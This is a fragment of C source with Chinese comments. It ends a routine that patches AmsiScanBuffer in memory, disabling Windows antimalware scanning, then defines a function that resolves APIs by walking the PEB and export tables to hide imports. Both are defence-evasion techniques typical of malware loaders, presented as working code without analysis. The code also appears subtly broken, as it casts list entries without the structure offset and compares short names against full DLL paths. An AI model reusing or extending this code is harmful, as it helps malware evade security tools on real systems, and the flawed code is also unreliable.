    VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);

    // 写入补丁
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
}

// ============ 动态API解析模块 ============
FARPROC ResolveAPI(const char* dllName, const char* funcName) {
    // 手动遍历PEB查找模块
    PEB* peb = (PEB*)__readgsqword(0x60);
    LIST_ENTRY* list = &peb->Ldr->InMemoryOrderModuleList;

    for (LIST_ENTRY* entry = list->Flink; entry != list; entry = entry->Flink) {
        LDR_DATA_TABLE_ENTRY* mod = (LDR_DATA_TABLE_ENTRY*)entry;

        // 解析模块名（Unicode转换）
        wchar_t* wcName = mod->FullDllName.Buffer;
        char cName[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, wcName, -1, cName, MAX_PATH, NULL, NULL);

        // 大小写不敏感比较
        if (_stricmp(cName, dllName) == 0) {
            // 遍历导出表
            IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)mod->DllBase;
            IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(mod->DllBase + dos->e_lfanew);
            IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(mod->DllBase + 
                nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            DWORD* nameRVA = (DWORD*)(mod->DllBase + exp->AddressOfNames);
            WORD* ordinal = (WORD*)(mod->DllBase + exp->AddressOfNameOrdinals);
            DWORD* funcRVA = (DWORD*)(mod->DllBase + exp->AddressOfFunctions);

            for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                char* fnName = (char*)(mod->DllBase + nameRVA[i]);
                if (strcmp(fnName, funcName) == 0) {
                    return (FARPROC)(mod->DllBase + funcRVA[ordinal[i]]);
                }
            }
        }
    }
    return NULL;
}

